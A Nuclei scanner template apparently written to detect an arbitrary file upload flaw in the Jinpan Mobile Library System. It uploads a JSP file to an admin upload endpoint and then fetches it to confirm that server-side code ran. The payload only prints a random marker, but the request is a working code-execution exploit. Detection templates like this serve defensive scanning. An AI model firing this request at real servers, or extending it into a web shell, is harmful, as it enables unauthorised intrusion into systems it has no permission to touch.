id: jinpan-mobile-library-system-doupload-jsp-anyfile-upload
info:
  name: Jinpan Mobile Library System Arbitrary File Upload
  author: ProjectDiscoveryAI
  severity: critical
  tags: file-upload

variables:
  t1: "{{base64(rand_base(5))}}"
  datetime: "{{date_time('2006-01-02')}}"

flow: http(1) && http(2)

http:
  - id: upload-file
    method: POST
    path:
      - "{{BaseURL}}/pages/admin/tools/uploadFile/doUpload.jsp"
    headers:
      Content-Type: "multipart/form-data; boundary=399e563f0389566bd40fd4d6409a67dd"
    body: |-
      --399e563f0389566bd40fd4d6409a67dd
      Content-Disposition: form-data; name="file"; filename="jILUp0.jsp.jsp"

      <% out.println("{{t1}}"); %>
      --399e563f0389566bd40fd4d6409a67dd--
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "\"filePaths\""
    extractors:
      - type: regex
        name: file_name
        part: body
        internal: true
        regex:
          - "(?P<name>[0-9]{10,16}).jsp"

  - id: verify-upload
    method: GET
    path:
      - "{{BaseURL}}/upload/{{datetime}}/{{file_name}}.jsp"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "{{t1}}"
      - type: word
        part: body
        words:
          - "<"
        negative: true
